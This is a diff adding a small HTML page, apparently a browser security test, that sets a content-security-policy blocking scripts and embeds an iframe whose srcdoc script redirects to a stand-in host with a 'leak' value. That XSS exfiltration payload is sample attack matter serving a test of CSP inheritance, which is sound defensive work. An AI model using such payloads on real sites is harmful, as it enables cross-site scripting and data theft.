@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="content-security-policy" content="script-src 'none'">
+    <meta charset="utf-8" />
+    <title>You can't XSS me</title>
+  </head>
+  <body>
+    <!--  XSS Start -->
+    <iframe
+      srcdoc="<script> location.href = 'https://a.test/report/?leak=c1001283'</script>"
+    ></iframe>
+    <!-- XSS End -->
+  </body>
+</html>
